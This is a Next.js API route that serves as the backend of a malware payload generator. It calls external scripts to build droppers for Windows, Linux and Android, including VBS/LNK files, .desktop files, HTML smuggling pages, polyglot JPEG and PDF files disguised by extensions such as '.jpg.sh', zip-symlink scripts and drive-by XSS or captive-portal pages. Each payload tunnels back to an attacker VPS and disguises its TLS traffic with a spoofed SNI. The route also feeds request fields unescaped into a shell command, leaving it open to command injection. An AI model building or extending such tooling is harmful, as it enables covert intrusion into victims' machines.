
import { NextRequest, NextResponse } from 'next/server'
import { spawn } from 'child_process'
import { readFile } from 'fs/promises'
import path from 'path'

const POLYGLOT_SCRIPT = '/home/plasencio/ssh-tunnel-manager-clean/scripts/polyglot_gen.py'

interface GeneratePayloadRequest {
  platform: 'windows' | 'linux' | 'android'
  payloadType: 'lnk' | 'desktop' | 'html-smuggling' | 'polyglot-jpeg' | 'polyglot-pdf' | 'zip-symlink' | 'apk-template'
  technique: string
  vpsHost: string
  vpsPort: string
  sni: string
  useTLS: boolean
  binaryName: string
  outputName: string
}

let pythonCmd = 'python3'

// Detect Python
async function detectPython(): Promise<string> {
  const { execSync } = require('child_process')
  try { execSync('python3 --version', { stdio: 'ignore' }); return 'python3' } catch {}
  try { execSync('python --version', { stdio: 'ignore' }); return 'python' } catch {}
  return 'python3'
}

export async function POST(request: NextRequest) {
  try {
    const body: GeneratePayloadRequest = await request.json()
    const { platform, payloadType } = body

    pythonCmd = await detectPython()


    // Drive-by templates use shell script
    const drivebyTypes = ['html-sw', 'html-captive', 'html-xss']
    if (drivebyTypes.includes(body.payloadType)) {
      const templateMap: Record<string, string> = {
        'html-sw': 'sw',
        'html-captive': 'captive',
        'html-xss': 'xss',
      }
      const template = templateMap[body.payloadType]
      const outputPath = `/tmp/payloads/${body.outputName || 'driveby'}.html`
      const drivebyCmd = `/home/plasencio/ssh-tunnel-manager-clean/scripts/driveby_generator.sh ${template} ${body.vpsHost} ${body.binaryName} ${outputPath}`
      
      const { execSync } = require('child_process')
      execSync(drivebyCmd, { timeout: 5000 })
      const fileBuffer = await readFile(outputPath)
      return new NextResponse(fileBuffer, {
        headers: {
          'Content-Type': 'text/html',
          'Content-Disposition': `attachment; filename="${body.outputName || 'driveby'}.html"`,
        },
      })
    }

    // Call polyglot generator
    const configJson = JSON.stringify({
      platform,
      payloadType,
      technique: body.technique || 'wstunnel',
      vpsHost: body.vpsHost,
      vpsPort: body.vpsPort || '443',
      sni: body.sni || 'google.com',
      useTLS: body.useTLS !== false,
      binaryName: body.binaryName || 'svc.exe',
      outputName: body.outputName || 'payload',
      includeCloner: (body as any).includeCloner || false,
    })

    const output = await new Promise<string>((resolve, reject) => {
      const proc = spawn(pythonCmd, [POLYGLOT_SCRIPT, configJson])
      let stdout = ''
      let stderr = ''
      proc.stdout.on('data', (d: Buffer) => stdout += d.toString())
      proc.stderr.on('data', (d: Buffer) => stderr += d.toString())
      proc.on('close', (code: number) => {
        if (code !== 0) reject(new Error(stderr || `Exit ${code}`))
        else resolve(stdout.trim())
      })
      proc.on('error', reject)
    })

    const result = JSON.parse(output)
    if (result.error) {
      return NextResponse.json({ error: result.error }, { status: 500 })
    }

    // Read the generated file
    const filePath = result.path
    const fileBuffer = await readFile(filePath)

    // Determine content type
    const contentTypeMap: Record<string, string> = {
      'polyglot-jpeg': 'application/octet-stream',
      'polyglot-pdf': 'application/pdf',
      'desktop': 'application/x-desktop',
      'html-smuggling': 'text/html',
      'lnk': 'text/plain',
      'zip-symlink': 'application/x-shellscript',
    }

    const extMap: Record<string, string> = {
      'polyglot-jpeg': '.jpg.sh',
      'polyglot-pdf': '.pdf',
      'desktop': '.desktop',
      'html-smuggling': '.html',
      'lnk': '.vbs',
      'zip-symlink': '.sh',
    }

    const filename = (body.outputName || 'payload') + (extMap[payloadType] || '')

    return new NextResponse(fileBuffer, {
      headers: {
        'Content-Type': contentTypeMap[payloadType] || 'application/octet-stream',
        'Content-Disposition': `attachment; filename="${filename}"`,
      },
    })
  } catch (error: any) {
    console.error('Payload generation error:', error.message || error)
    return NextResponse.json({ error: `Generation failed: ${error.message || error}` }, { status: 500 })
  }
}
